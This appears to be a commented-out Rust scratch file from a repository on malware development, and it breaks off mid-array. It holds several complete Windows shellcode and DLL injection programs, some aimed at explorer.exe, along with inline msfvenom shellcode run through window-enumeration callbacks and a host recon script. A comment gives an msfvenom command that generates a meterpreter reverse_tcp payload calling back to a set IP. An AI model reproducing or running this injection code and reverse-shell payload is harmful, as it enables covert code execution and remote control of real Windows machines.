//     let pid = input[1].parse::<u32>().expect("Please provide PID in Proper Format");

//     println!("(+) Opening Handle to process : {}", &input[1] );

//     let shellcode:[] = ["\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"];
//     unsafe{
//         let process = OpenProcess(THREAD_ALL_ACCESS, NULL as _, pid);
//         if process == NULL{
//             println!("[+] Cannot get Process {}, error: {}", pid,GetLastError());
//         }
//         println!("[-] Got an Handle to the process! :\\\\---0x{:p}",process);
//         let buffer = VirtualAllocEx(NULL as _,  NULL as _, std::mem::size_of::<char>() , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//         println!("Size allocated with rwx permissions: {:?}",std::mem::size_of::<char>());
//     }
// }

// use std::{
//     mem::transmute;
//     ptr::{null,null_mut}
// };
// use sysinfo::{PidExt, ProcessExt, System, SystemExt};


// fn main(){

// }


// use std::io::Write;

// macro_rules! read {
//     ($out:ident as $type:ty) => {
//         std::io::stdout().flush().unwrap();
//         let mut inner = String::new();
//         std::io::stdin().read_line(&mut inner).expect("Please validate the Input");
//         let $out = inner.trim().parse::<$type>().expect("Error at validating"); 
//     };
// }

// fn arrays(data: &mut [i32]) -> i32{
//     let sum: i32 = data.iter().copied().sum();

//     let _ = data.iter_mut().fold(sum, |sum, item| {
//         *item = sum - *item;
//         *item
//     });

//     return sum;

// }


// fn main(){
//     let mut test: Vec<i32> = Vec::new();
//     print!("Enter the integer to store :");
//     read!(n as u32);
//     print!("Enter the strings: ");
//     for _ in 0..n{
//         read! (s as i32);
//         test.push(s);
//     }
//     let ans = arrays(&mut test);
//     println!("{}", ans);
// }

// use std::mem::transmute;

// use winapi::

// extern  crate windows_sys:

// use windows_sys::Win32::Foundation::{CloseHandle,GetLastError,FALSE};


// Writing Shell code and injecting into thread !


// #[allow(unused_imports)]
// #[allow(unused_import_braces)]
// use std::include_bytes;
// use std::mem::transmute;
// use std::ptr::null_mut;
// use sysinfo::*;
// use winapi::um::processthreadsapi::CreateRemoteThread;
// use winapi::um::synchapi::WaitForSingleObject;
// use winapi::um::winbase::WAIT_FAILED;
// use winapi::um::winnt::PROCESS_ALL_ACCESS;
// // use winapi::shared::ntdef::FALSE; 
// use winapi::shared::minwindef::FALSE;
// // use winapi::um::processthreadsapi::OpenProcess;
// // // OR
// // use winapi::shared::minwindef::FALSE;
// use winapi::um::{
//     handleapi::CloseHandle, // If you want to free up , you can do it manually ! 
//     errhandlingapi::GetLastError,
//     winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE},
//     processthreadsapi::OpenProcess,
//     memoryapi::{WriteProcessMemory,VirtualAllocEx,VirtualProtectEx}};

// fn main() -> std::io::Result<()>{

//     // ShellCode Link : https://github.com/peterferrie/win-exec-calc-shellcode/tree/master/build/bin
//     // Download the shellcode and Execute from it 
//     let shellcode = include_bytes!("../w64-exec-calc-shellcode-func.bin");
//     let size = shellcode.len();
//     let mut system = System::new();
//     system.refresh_processes();
//     println!("{:?}", shellcode);

//     let pid = system
//         .processes_by_name("explorer.exe")
//         .next()
//         .expect("[-] No Process")
//         .pid()
//         .as_u32();

//     unsafe{
//         let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
//         if handle == null_mut(){
//             panic!("Failed to Get OpenProcess: {}",GetLastError());
//         }
//         let address = VirtualAllocEx(handle,null_mut(), size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);
//         if address.is_null(){
//             panic!("[-] Failed to Get Address: {}", GetLastError());
//         }
//         let res = WriteProcessMemory(handle, address,shellcode.as_ptr().cast(), size,null_mut());
//         if res == FALSE{
//             panic!("[-] Failed to Write Process to Memory : {}",GetLastError());
//         }
//         let mut old = PAGE_READWRITE;
//         let res = VirtualProtectEx(handle, address, size, PAGE_EXECUTE, &mut old);
//         if res == FALSE {
//             panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
//         }

//         let func = transmute(address);
//         let thread = CreateRemoteThread(handle,null_mut(), 0, func, null_mut(),0, null_mut());
        
//         if thread == null_mut(){
//             panic!("[-] Failed to create Remote Process : {}",GetLastError());
//         }    
//         WaitForSingleObject(thread,WAIT_FAILED);

//         let clean = CloseHandle(handle);
//         if clean == FALSE{
//             println!("[-] Unable to close the Handle!");
//         }
//     }
//     println!("[+] Remote Code Executed Successfully !");
//         // As i said , you dont need to free up space . Rust will automatically take care when goes out of scope ! . If you do so you can do it on your own !
//     Ok(())
// }

// use std::fs::File;
// use std::io::Read;
// // use std::env;

// fn main() -> std::io::Result<()>{
//     let mut file = File::open("shellcode.txt")?;
//     let mut contents = Vec::new();
//     file.read_to_end(&mut contents)?;
//     println!("File content : {:?}", contents);
//     Ok(())
// }
// use sysinfo::*;
// fn main(){
    // let mut sys = System::new_all();
    // sys.refresh_all();

    // println!("==> SYSTEM:");
    // println!("Total Memory: {} bytes",sys.total_memory());
    
    // println!("Disk Info =>");
    // let disks = Disks::new_with_refreshed_list();
    // for disk in &disks{
    //     println!("{:?}",disk)
    // }
    // let networks = Networks::new_with_refreshed_list();
    // println!("=> networks:");
    // for (interface_name, data) in &networks {
    //     println!("{interface_name}: {}/{} B", data.received(), data.transmitted());
    // }

    // let mut system = System::new();
    // system.refresh_processes();

    // let pid = system
    //     .processes_by_name("vmware-authd.exe")
    //     .next()
    //     .expect("[-] No Process")
    //     .pid()
    //     .as_u32();

    // println!("{}",pid);

    // println!("[+] Current Directory Execution {:?}",std::env::current_dir())
// }



// const POS: &str = "[+]";
// const NEG: &str = "-";

// // extern crate sysinfo;

// extern crate sysinfo;

// #[allow(unused_imports)]
// // use sysinfo::{Disk, System};
// use sysinfo::{
//     Components, Disks, Networks, System, Users,CpuRefreshKind,RefreshKind,Pid
// };

// use std::{any::Any, process::Command};

// fn main(){
//     let mut system = sysinfo::System::new_all();

//     system.refresh_all();

//     println!("{} System Information", POS);
//     println!("{} OS: {} {}", NEG ,System::name().unwrap_or("Unable to find system name".to_string()), 
//         System::os_version().unwrap_or("Unknown".to_string()));
//     // println!("{} Kernel Version: {}", NEG,System::kernel_version().unwrap_or("Unable to Find".to_string())); // This methods it for Linux!
//     println!("{} Host name : {}", NEG, System::host_name().unwrap_or("Unable to find Host Name".to_string()));
//     println!();

//     println!("{} CPU Information:",POS);
//     let s =  System::new_with_specifics(
//         RefreshKind::new().with_cpu(CpuRefreshKind::everything())
//     );

//     println!("{} CPU Usage : {}%", NEG,s.global_cpu_info().cpu_usage());

//     let cpu_info = system.global_cpu_info();
//     println!("{} Model : {:?}", NEG, cpu_info.name());
//     println!("{} Usage : {}", NEG ,cpu_info.cpu_usage());
//     let cpu_cores = system.physical_core_count();
//     if cpu_cores.is_some(){
//         println!("{} Cores: {}", NEG, cpu_cores.unwrap());
//         // println!("{} Total Cores: {}", NEG, )
//     } else{
//         println!("{} Unable to Retrieve CPU cores !",NEG);
//     }
//     println!();

//     println!("{} Disk Information",POS);
//     let disk_info = Disks::new_with_refreshed_list();
//     for d in &disk_info{
//         // println!("{:?}",disk);
//         // println!("Name: {:?}",d.mount_point());
//         print!("{} Name: {}",NEG, d.name().to_string_lossy());
//         print!(" FS: {:?}",d.file_system().to_string_lossy());
//         // print!(" Type: {:?}",d.type_id());
//         print!(" Removeable Device: {}",d.is_removable());
//         print!(" Mount Point: {:?}" ,d.mount_point());
//         println!(" Disk Space : {:.2} GB / {:.2} GB ", 
//             d.available_space() as f64 / (1024.0 * 1024.0 * 1024.0) ,
//             d.total_space() as f64 / (1024.0 * 1024.0 * 1024.0));

//         // d.type_id(), d.is_removable(), d.mount_point()
//     }
//     println!();

//     println!();
//     println!("{} User Information",POS);
//     let user = Users::new_with_refreshed_list();
//     for u in user.list(){
//         // println!("{:?}",u);
//         // println!("{:?}",u.id());
//         println!("{} Users: {} : {:?}", NEG, u.name(), u.type_id());
//         // let sid = u.id();
//         // println!("{:?}",sid);
    
//         // Tried to access the sid that was inside the PID , but i failed !

//         // println!("{:?}", sid.sid.iter().map(|x| format!("{:02}", x)).collect::<Vec<_>>().join("-"));
//         // println!("{} ")
//     }
//     // To view the full process
//     // for (pid, process) in system.processes() {
//     //     println!("{} [{}] {} {:?}", NEG,pid ,process.name(), process.disk_usage());
//     // }

//     println!("{} Network Adapters",POS);
//     let net_lans = Networks::new_with_refreshed_list();

//     for (inter_name, _) in &net_lans{
//         println!("{} {}B", NEG,inter_name);
//     }
    
//     // Find Particualr Process iD's 
//     println!();
//     println!("{} Custom PID's",POS);
//     let check_process_lists = ["explorer.exe","winlogon.exe","wininit.exe"];
//     for process in check_process_lists{
//         let pid = system
//             .processes_by_name(process)
//             .next()
//             .expect("[-] No such Process")
//             .pid()
//             .as_u32();

//         println!("{} PID: {} : {}",NEG,process,pid);
//     }
    
//     // Printing ARPS!
//     println!("{} ARPS!",POS);
//     let arp = Command::new("powershell.exe")
//     .args(&["arp","-a"])
//     .output()
//     .expect("Failed to Receive the Information");

//     if arp.status.success(){
//         println!("{} Inferface IPs!: {}", NEG,String::from_utf8_lossy(&arp.stdout));
//     }else {
//         println!("Command not found Exit Status! {}",arp.status.code().unwrap());
//     }

    
//     // Kill Process !
//     println!();
//     println!("{} PID Termination",POS);
//     let s = System::new_all();
//     let pid_demo = system
//         .processes_by_name("notepad.exe").next().expect("[-] No Such Process").pid();

//     if let Some(pos) = s.process(Pid::from(pid_demo)){
//         pos.kill();
//         println!("{} PID {} Terminated Successfully",NEG,pid_demo);
//     } else {
//         println!("{} PID Not Found !",NEG);
//     }
// }



// fn main(){
//     let codes = include_bytes!("../w64-exec-calc-shellcode-func.bin");
//     println!("{:?}",codes);
// }

/* 
An Rust Program that injects shellcode into an target process and executes it Remotely.
Github Link: https://github.com/Whitecat18/Rust-for-Malware-Development
*/

// #[allow(unused_imports)]
// #[allow(unused_import_braces)]
// use std::include_bytes;
// use std::mem::transmute;
// use std::ptr::null_mut;
// use sysinfo::*;
// use winapi::um::processthreadsapi::CreateRemoteThread;
// use winapi::um::synchapi::WaitForSingleObject;
// use winapi::um::winbase::WAIT_FAILED;
// use winapi::um::winnt::PROCESS_ALL_ACCESS;
// // use winapi::shared::ntdef::FALSE; 
// use winapi::shared::minwindef::FALSE;
// // use winapi::um::processthreadsapi::OpenProcess;
// // // OR
// // use winapi::shared::minwindef::FALSE;
// use winapi::um::{
//     handleapi::CloseHandle, // If you want to free up , you can do it manually ! 
//     errhandlingapi::GetLastError,
//     winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE},
//     processthreadsapi::OpenProcess,
//     memoryapi::{WriteProcessMemory,VirtualAllocEx,VirtualProtectEx}};

// fn main() -> std::io::Result<()>{

//     // ShellCode Link : https://github.com/peterferrie/win-exec-calc-shellcode/tree/master/build/bin
//     // Download the shellcode and Execute from it 
//     let shellcode = include_bytes!("../w64-exec-calc-shellcode-func.bin");
//     let size = shellcode.len();
//     let mut system = System::new();
//     system.refresh_processes();
//     println!("{:?}", shellcode);

//     let pid = system
//         .processes_by_name("explorer.exe")
//         .next()
//         .expect("[-] No Process")
//         .pid()
//         .as_u32();

//     unsafe{
//         let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
//         if handle == null_mut(){
//             panic!("Failed to Get OpenProcess: {}",GetLastError());
//         }
//         let address = VirtualAllocEx(handle,null_mut(), size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);
//         if address.is_null(){
//             panic!("[-] Failed to Get Address: {}", GetLastError());
//         }
//         let res = WriteProcessMemory(handle, address,shellcode.as_ptr().cast(), size,null_mut());
//         if res == FALSE{
//             panic!("[-] Failed to Write Process to Memory : {}",GetLastError());
//         }
//         let mut old = PAGE_READWRITE;
//         let res = VirtualProtectEx(handle, address, size, PAGE_EXECUTE, &mut old);
//         if res == FALSE {
//             panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
//         }

//         let func = transmute(address);
//         let thread = CreateRemoteThread(handle,null_mut(), 0, func, null_mut(),0, null_mut());
        
//         if thread == null_mut(){
//             panic!("[-] Failed to create Remote Process : {}",GetLastError());
//         }    
//         WaitForSingleObject(thread,WAIT_FAILED);

//         let clean = CloseHandle(handle);
//         if clean == FALSE{
//             println!("[-] Unable to close the Handle!");

//         // Just an Info : you dont need to free up space . Rust will automatically take care when goes out of scope ! . If you do so you can do it on your own !

//         }
//     }
//     println!("[+] Remote Code Executed Successfully !");
//     Ok(())
// }


// use std::arch::asm;

// fn main(){
//     #[link_section = ".text"]
//     static SHELLCODE: [u8;319] = *include_bytes!("../shellcode.bin");

//     unsafe{
//         asm!(
//             "call {}",in(reg) SHELLCODE.as_ptr(),
//         )
//     }
// }


// const POS: &str = "[+]";
// const NEG: &str = "[-]";
// const WIDE: &str = "[x]";

// use std::process::exit;
// use std::env;
// use std::ptr::null_mut;

// use winapi::shared::minwindef::LPVOID;
// use winapi::um::errhandlingapi::GetLastError;
// use winapi::um::handleapi::CloseHandle;
// use winapi::um::memoryapi::{VirtualAlloc, VirtualAllocEx, WriteProcessMemory};
// use winapi::um::minwinbase::LPTHREAD_START_ROUTINE;
// use winapi::um::processthreadsapi::{OpenProcess,CreateRemoteThread};
// use winapi::um::shellapi::ASSOCCLASS_FOLDER;
// use winapi::um::winnt::{AssemblyDetailedInformationInActivationContext, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS,MEM_RESERVE};
// use winapi::shared::ntdef::FALSE;
// use std::ffi::CString;

// fn main(){
//     let pid: Vec<String> = env::args().collect();
//     //DWORD is unsigned 32 bit (u32) 
//     let vec = pid.iter().skip(1).filter_map(|num| num.parse().ok()).collect::<Vec<u32>>();

//     // println!("{:?}",vec);
//     if vec.len() != 1{
//         panic!("{} NO PID : Please provide PID To continue !",POS);
//         // panic!("");
//             // println!("{} NO PID !",POS);
//             // exit(1);
//     }
//     // println!("{} YES I GOT THE PID: {}",POS,vec[0]);
    
//     // Your SHellcode Here!!

//     // let shellcode = include_bytes!("../shellcode.bin");
//     let shellcode = include_bytes!("../shellcode.bin");
//     let size_of_shellcode = shellcode.len();

//     unsafe{
//         let process = OpenProcess(
//             PROCESS_ALL_ACCESS, 
//             FALSE as i32 ,
//             vec[0]
//         );
        
//         if process.is_null(){
//             panic!("{} Failed to open process !",WIDE);
//         }

//         let buffer = VirtualAllocEx(
//             process, 
//             null_mut(), 
//             size_of_shellcode, 
//             MEM_RESERVE | MEM_COMMIT, 
//             PAGE_EXECUTE_READWRITE, 
//         );

//         if buffer.is_null(){
//             panic!("{} Failed to allocate memory in remote process",WIDE);
//         }

//         // mut
//         let bytes_write: usize = 0;

//         let result = WriteProcessMemory(
//             process, 
//             buffer , 
//             shellcode.as_ptr() as LPVOID, 
//             size_of_shellcode,
//             null_mut(),
//         );

//         if result == 0 || bytes_write != size_of_shellcode{
//             panic!("{} Failed to write the shellcode to the remote process",WIDE);
//         }


//         let remote_thread = CreateRemoteThread(
//             process,
//             null_mut(),
//             0,
//             Some(std::mem::transmute(buffer)),
//             null_mut(),
//             0,
//             null_mut()
//         );

//         if remote_thread.is_null(){
//             panic!("{} Failed to create remote thread",WIDE);
//         }

//         CloseHandle(process);
//     }
// }


/* 

For more Rust Codes : https://github.com/Whitecat18/Rust-for-Malware-Development.git

Code to inject and execute shellcode into a remote process specified by its PID that runs in the same process PID !.
This is just an Example demo i have written in. you can create your own shellcode you need! . This program allows all kinds of shellcode !

Example i used to generate dummy shellcode for just Demo purpuse . you can use the same format! 

`
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.102.93 LPORT=4444 EXITFUNC=thread -f raw --var-name=Smukx -o shellcode.bin
`

// */
// const OKI: &str = "[+]";
// // const MIS: &str = "[-]";


// use std::{env::args, ptr::null_mut, u64::MIN};

// //ntdef::NULL
// use winapi::{
//     shared::minwindef::LPVOID, 
//     um::{errhandlingapi::GetLastError, handleapi::CloseHandle, 
//         winbase::INFINITE,
//         memoryapi::{VirtualAllocEx, WriteProcessMemory}, 
//         processthreadsapi::{CreateRemoteThreadEx, OpenProcess}, 
//         synchapi::WaitForSingleObject, 
//         winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS}
// }};

// // type LpthreadStartRoutine = unsafe extern "system" fn(lp_parameter: LPVOID) -> DWORD;

// fn main(){
//     let pid_inp = args().collect::<Vec<String>>();

//     if pid_inp.len() != 2{
//         panic!("{} Provide Proper PID", OKI);
//     }

//     let pid = pid_inp[1].parse::<u32>().expect("Provide Proper input !");
//     println!("{} PID: {}", OKI, pid);

//     let shellcode = include_bytes!("../shellcode.bin");
    
//     unsafe{
//         let process = OpenProcess(
//             PROCESS_ALL_ACCESS,
//             false as i32,
//             pid
//         );

//         if process.is_null(){
//             panic!("{} Failed to create an Process {}", MIN, GetLastError());
//         }

//         println!("{} Process Has been allocated: {:?}",OKI,process);


//         let buffer = VirtualAllocEx(
//             process, 
//             null_mut(),
//             shellcode.len(),
//             MEM_RESERVE | MEM_COMMIT,
//             PAGE_EXECUTE_READWRITE,
//         );

//         if buffer.is_null(){
//             panic!("{} Failed to Allocate to Process Mem. Error: {}",OKI,GetLastError());
//         }

//         println!("{} Allocated Buffer sise: {:?}",OKI,buffer);


//         let mut bytes: usize = 0;

//         let result = WriteProcessMemory(
//             process, 
//             buffer,
//             shellcode.as_ptr() as LPVOID, 
//             shellcode.len(), 
//             &mut bytes,
//         );
        
//         if result == 0 || bytes != shellcode.len(){
//             panic!("{} Failed to write the shellcode to the remote process. Error:{}",OKI,GetLastError());
//         }

//         // dummy thread id -> Found an alternet way !!
//         // let tid: DWORD = NULL;
//         let rem_thread = CreateRemoteThreadEx(process,
//             null_mut(), 
//             0,   
//             std::mem::transmute(buffer), 
//             null_mut(),
//             0,
//             null_mut(), 
//             null_mut(),
//         );

//         if rem_thread.is_null() {
//             panic!("{} Failed to create remote thread. Error : {}",OKI,GetLastError());
//         }

//         println!("{} Got an Handle to the Remote thread: {:?}",OKI, rem_thread);
        
//         WaitForSingleObject(rem_thread, INFINITE);
//         CloseHandle(rem_thread);
//         println!("{} Cleaning UP Thread ",OKI);
//         CloseHandle(process);
//         println!("{} Cleaning UP Process",OKI);
//     }
// }

// use std::arch::asm;

// #[cfg(target_os = "windows")]
// fn main() {
//     #[link_section = ".text"]
//     static SHELLCODE: [u8; 98] = *include_bytes!("../w64-exec-calc-shellcode-func.bin");

//     unsafe {
//         asm!(
//         "call {}",
//         in(reg) SHELLCODE.as_ptr(),
//         )
//     }
// }

// >> DLL INJECTION

// use std::env::args;
// use std::ptr::null_mut;
// // use winapi::shared::minwindef::LPVOID;
// use winapi::um::errhandlingapi::GetLastError;
// use winapi::um::handleapi::CloseHandle;
// use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
// use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
// // use winapi::um::minwinbase::LPTHREAD_START_ROUTINE;
// use winapi::um::processthreadsapi::CreateRemoteThread;
// use winapi::um::synchapi::WaitForSingleObject;
// use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
// use winapi::um::{processthreadsapi::OpenProcess, winnt::PROCESS_ALL_ACCESS};
// use winapi::shared::ntdef::NULL;
// use winapi::ctypes::c_void;
// use windows::Win32::System::Threading::INFINITE;
// // use winapi::um::handleapi::HANDLE
// // use winapi::um::winnt::{HANDLE,LPCSTR};

// const PLU: &str = "[+]";

// fn main(){
//     let pid_inp = args().collect::<Vec<String>>();
//     // let inp = inp[1].trim().parse::<i32>();

//     if pid_inp.len() != 2{
//         println!("{} Usage: dll_inject.exe <PID>",PLU);
//         return;
//     }

//     let pid = pid_inp[1].parse::<u32>().expect("Provide Valid PID");
//     println!("{} PID: {}",PLU,pid);
    
//     unsafe{                                                              //hook.dll
//         // let dllpath = "C:\\Users\\KAVIN STUDIO\\Desktop\\rust\\learn\\hook.dll";
//         let dllpath = "H:\\malware_development\\hook\\target\\release\\hook.dll";
//         // let dllpath = "hook.dll";
//         let dllsize = dllpath.len();
//         let process = OpenProcess(PROCESS_ALL_ACCESS, false as i32 ,pid);
        
//         if process == NULL{
//             println!("{} failed to get handle to the process: {}",PLU,GetLastError());
//             return
//         }

//         println!("{} HANDLE of {} : {:?} ",PLU,pid,process);
        
//         let buffer = VirtualAllocEx(
//             process,
//             null_mut(), 
//             dllsize, 
//             MEM_COMMIT|MEM_RESERVE, 
//             PAGE_READWRITE, 
//         );

//         println!("{} Buffer Allocated to process memory with readwrite permission: {:#?}",PLU,buffer);

//         if buffer == null_mut(){
//             println!("{} Failed to allocate buffer: error: {}",PLU,GetLastError());
//             return
//         }

//         WriteProcessMemory(
//             process,
//             buffer, 
//             dllpath.as_ptr() as *const c_void, 
//             dllsize, null_mut()
//         );
        
//         println!("{} wrote [{}] to process memory !",PLU,dllpath);
                

//         // Sick work starts from here ;<( 
//         // Calling kernel32.dll and LoadLibraryA


//         let kernel32 = GetModuleHandleA("kernel32.dll\0".as_ptr() as *const _);

//         // let kernel32 = LoadLibraryW("Kernel32\0".as_ptr() as *const u16);

//         if kernel32 == null_mut(){
//             println!("{} Failed to get handle to kernel32.dll. Error: {}",PLU,GetLastError());
//             CloseHandle(process);
//             return
//         }
//         println!("{} Got a handle to kernel32.dll: {:#?}",PLU,kernel32);
        
//         let kernel32_addr = GetProcAddress(kernel32,"LoadLibraryA\0".as_ptr() as *const _);

//         if kernel32_addr.is_null(){
//             println!("{} Failed to get address of LoadLibrary. Error: {:#?}",PLU,kernel32_addr);
//             return
//         }
//         println!("{} LoadLibraryA Address : {:#?}",PLU,kernel32_addr);

//         // This is some thing that i tried something new . got bunch of errors when i tried . will be used on reflective DLL.  


//         // Calling the LoadLibrary Function !
//             // Some shit i tried but not worked as i expected !
//         // let load_lib: LPTHREAD_START_ROUTINE = {
//         //     let lib_name = CString::new("LoadLibraryW").unwrap();
//         //     let load_lib_ptr = GetProcAddress(kernel32, lib_name.as_ptr());
//         //     // if load_lib_ptr == null_mut() or NULL
//         //     if load_lib_ptr.is_null(){
//         //         println!("{} Failed to get the address of LoadLibraryW {}",PLU,GetLastError());
//         //         return
//         //     }
//         //     std::mem::transmute(load_lib_ptr)
//         // };

//         // let load_lib: unsafe extern "system" fn(LPVOID) -> HANDLE = std::mem::transmute(GetProcAddress(kernel32,b"LoadLibraryA\0".as_ptr() as LPCSTR));
//         // let load_library: extern "system" fn(LPVOID) -> HANDLE = std::mem::transmute(GetProcAddress(kernel32, b"LoadLibraryA\0".as_ptr() as LPCSTR));

//         // if load_lib == null_mut(){
//         //     println!("{} Failed to get the address of the LoadLibraryA. Error: {}",PLU,GetLastError());
//         //     return
//         // }

//         // type LoadLibraryFn = unsafe extern "system" fn(*mut winapi::ctypes::c_void) -> u32;
//         // // type LoadLibraryFn = extern "system" fn(lp_libfilename: LPCSTR) -> HANDLE;

//         // let load_library: LoadLibraryFn = {
//         //     // Get the address of LoadLibraryA
//         //     let load_library_addr = GetProcAddress(kernel32, b"LoadLibraryA\0".as_ptr() as LPCSTR);
//         //     if load_library_addr.is_null() {
//         //         println!("Failed to get the address of LoadLibraryA.");
//         //         return;
//         //     }
//         //     std::mem::transmute(load_library_addr)
//         // };

//         // let load_val = load_library(buffer as LPCSTR);
//         // if load_val.is_null(){
//         //     println!("{} Failed to load the dll into the target process: {}",PLU,GetLastError());
//         //     return
//         // }
//         // println!("{} Got the address of the LoadLibraryW: {:?}",PLU,load_library);

//         let thread = CreateRemoteThread(
//             process,
//             null_mut(),
//             0,
//             Some(std::mem::transmute(kernel32_addr)), 
//             buffer,
//             0,
//             null_mut(),
//         );

//         if thread.is_null(){
//             println!("{} Failed to get handle to the thread: {}",PLU,GetLastError());
//             return
//         }

//         WaitForSingleObject(thread, INFINITE);

//         println!("{} Finish Executing thread...",PLU);
//         CloseHandle(thread);
//         CloseHandle(process);
        
//         println!("{} DLL INJECTION EXECUTED SUCCESSFULLY :D",PLU);
//         return
//     }
// }


// extern crate winapi;

// use std::ptr;
// use winapi::um::libloaderapi::LoadLibraryW;
// // use winapi::um::handleapi::CloseHandle;
// use winapi::um::errhandlingapi::GetLastError;

// fn main() {
//     unsafe {
//         let kernel32 = LoadLibraryW("C:\\Windows\\System32\\kernel32.dll".as_ptr() as *const u16);
//         if kernel32.is_null() {
//             let last_error = GetLastError();
//             println!("Failed to get handle to kernel32.dll. Error: {}", last_error);
//             return;
//         }
//         println!("Got a handle to kernel32.dll: {:?}", kernel32);
//     }
// }


/*
        Iterates through all desktops associated with the 
    calling process's window station.

    For Code : https://github.com/Whitecat18/Rust-for-Malware-Development.git
    by @5mukx
*/

// const PLS:&str = "[+]";
// use std::ptr::null_mut;

// use winapi::um::{errhandlingapi::GetLastError, memoryapi::VirtualAlloc, winnt::{RtlMoveMemory, MEM_COMMIT, PAGE_EXECUTE_READWRITE}, winuser::{EnumDesktopsA, GetProcessWindowStation}};
// fn main(){

//     // calc shellcode generated from msfvenom !
//     let shellcode:[u8; 276]  = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,
//     0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
//     0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
//     0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
//     0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
//     0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
//     0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
//     0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
//     0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
//     0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
//     0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
//     0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
//     0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
//     0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
//     0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
//     0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
//     0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
//     0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
//     0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
//     0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,
//     0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
//     0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
//     0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
//     0x63,0x2e,0x65,0x78,0x65,0x00];  
//     unsafe{
//         let alloc = VirtualAlloc(
//             null_mut(), shellcode.len(),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
        
//         if alloc.is_null(){
//             println!("{} Failed to allocate memory: {}",PLS,GetLastError());
//         }
        
//         RtlMoveMemory(alloc, shellcode.as_ptr() as *const _ , shellcode.len());
        
//         EnumDesktopsA(GetProcessWindowStation(), std::mem::transmute(alloc) , 0);
//     }
// }



// fn handle<T: std::cmp::PartialOrd>(value: Vec<T>) -> Option<T>{
//     if value.len() < 5{
//         None
//     }else{
//         Some(value[4])
//     }
// }

// fn handle_options(option: Vec<Option<u32>>){
//     for i in option{
//         match i{
//             Some(num) => println!(" Found :{}",num),
//             None => println!("Found none"),
//         }
//     }
// }

// fn main(){
//     let vec1 = vec![1,2,3,4,5];
//     let vec2 = vec![1,2];
//     let mut options_vec:Vec<Option<u32>> = Vec::new();

//     options_vec.push(handle(vec1));
//     options_vec.push(handle(vec2));

//     handle_options(options_vec);
// }


// /*
//         Iterates through all desktops associated with the 
//     calling process's window station.

//     For Code : https://github.com/Whitecat18/Rust-for-Malware-Development.git
//     by @5mukx
// */

/*


*/
// const PLS:&str = "[+]";

// use std::{ffi::CString, ptr::null_mut};

// use winapi::um::{
//     errhandlingapi::GetLastError, 
//     handleapi::CloseHandle,
//     memoryapi::VirtualAlloc, 
//     synchapi::CreateMutexA, 
//     winnt::{RtlMoveMemory, MEM_RESERVE,MEM_COMMIT, PAGE_EXECUTE_READWRITE}, 
//     winuser::EnumChildWindows
// };


// fn main(){

//     let shellcode = [0x48,0x31,0xc9,0x48,0x81,0xe9,
// 0xc0,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,
// 0xbb,0xa5,0xe3,0x0e,0xa1,0x7d,0x7b,0x64,0x03,0x48,0x31,0x58,
// 0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x59,0xab,0x8d,
// 0x45,0x8d,0x93,0xa8,0x03,0xa5,0xe3,0x4f,0xf0,0x3c,0x2b,0x36,
// 0x4b,0x94,0x31,0x6b,0xe9,0xf6,0x29,0x04,0x4b,0x2e,0xb1,0x16,
